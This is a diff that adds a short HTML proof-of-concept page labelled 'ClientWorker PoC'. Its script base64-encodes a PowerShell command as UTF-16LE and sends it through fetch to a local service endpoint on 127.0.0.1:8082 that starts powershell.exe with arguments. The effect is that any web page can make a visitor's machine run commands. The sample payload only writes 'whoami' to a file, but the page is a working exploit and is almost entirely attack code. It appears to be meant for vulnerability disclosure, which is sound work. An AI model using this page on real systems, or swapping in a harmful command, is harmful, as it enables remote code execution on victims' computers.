@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+<body>
+<script>
+function toBase64Utf16LE(str) {
+    const bytes = new Uint8Array(str.length * 2);
+    for (let i = 0; i < str.length; i++) {
+        const c = str.charCodeAt(i);
+        bytes[i * 2]     = c & 0xff;
+        bytes[i * 2 + 1] = (c >> 8) & 0xff;
+    }
+    let binary = "";
+    for (const b of bytes) {
+        binary += String.fromCharCode(b);
+    }
+    return btoa(binary);
+}
+const command = 'whoami > C:\\ClientWorker\\out.txt';
+const encoded = toBase64Utf16LE(command);
+const url =
+    'http://127.0.0.1:8082/api/Client/StartProcessWithArguments/' +
+    'powershell.exe/' +
+    encodeURIComponent('-EncodedCommand ' + encoded);
+fetch(url, {
+    method: 'POST'
+})
+.then(r => console.log('HTTP:', r.status))
+.catch(e => console.error('FETCH ERROR:', e));
+</script>
+<h2>ClientWorker PoC</h2>
+</body>
+</html>
